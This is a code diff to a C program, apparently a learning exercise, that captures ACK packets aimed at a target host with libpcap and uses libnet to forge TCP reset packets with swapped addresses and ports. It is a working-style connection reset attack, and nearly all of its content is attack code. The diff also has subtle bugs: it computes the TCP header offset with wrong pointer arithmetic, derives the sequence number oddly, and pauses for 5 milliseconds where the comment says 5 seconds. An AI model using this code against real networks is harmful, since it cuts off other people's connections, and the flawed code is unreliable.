@@ -2,11 +2,15 @@
 #include <pcap.h>
 #include <libnet.h>
 #include <pcap/pcap.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <net/ethernet.h>
 
 typedef struct _cb_data
 {
     libnet_t *lnet;
-    libnet_ptag_t *ptag;
+    libnet_ptag_t ip_tag;
+    libnet_ptag_t tcp_tag;
 } cb_data;
 /**
   * @brief Set packet filter to filter ACK packet only
@@ -91,12 +95,46 @@ int set_packet_filter(pcap_t *hdlr, char *target_ip) {
 
 void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet)
 {
-    printf("caught packet\n");
+    cb_data *data = (cb_data *)user_args;
+
     /* Build packet ip part (libnet_build_ip)*/
+    struct iphdr *ip_hdr = (struct iphdr *)(packet + sizeof(struct  ether_header));
+    data->ip_tag = libnet_build_ipv4(
+                    LIBNET_TCP_H + LIBNET_IPV4_H,       /* Total packet len */
+                    IPTOS_LOWDELAY,                     /* tos */
+                    libnet_get_prand(LIBNET_PR16),      /* IP ID */
+                    0,                                  /* IP Frag */
+                    64,                                 /* TTL */
+                    IPPROTO_TCP,                        /* Upper layer protocol */
+                    0,                                  /* Checksum */
+                    ip_hdr->daddr,                      /* Source ip */
+                    ip_hdr->saddr,                      /* Dest ip */
+                    NULL,                               /* Payload */
+                    0,                                  /* Payload size */
+                    data->lnet,                         /* libnet context */
+                    data->ip_tag                        /* ptag */
+                );
 
     /* Build packet tcp part (RESET flags enabled) (libnet_build_tcp)*/
+    struct tcphdr *tcp_hdr = (struct tcphdr *)(ip_hdr + sizeof(struct iphdr));;
+    data->tcp_tag = libnet_build_tcp(
+                tcp_hdr->dest,                      /* source TCP port */
+                tcp_hdr->source,                    /* destination TCP port */
+                tcp_hdr->ack_seq >> 16,             /* sequence number */
+                libnet_get_prand(LIBNET_PRu16),     /* acknoledgement number */
+                TH_RST,                             /* control flags */
+                1024,                               /* Windows size */
+                0,                                  /* checksum */
+                0,                                  /* urgent pointer */
+                LIBNET_TCP_H,                       /* TCP packet size */
+                NULL,                               /* payload */
+                0,                                  /* payload length */
+                data->lnet,                                /* libnet context */
+                data->tcp_tag                             /* ptag */
+            );
 
     /* Send packet to network */ 
+    libnet_write(data->lnet);
 
-    /* Pause 5s */
+    usleep(5000);
 }
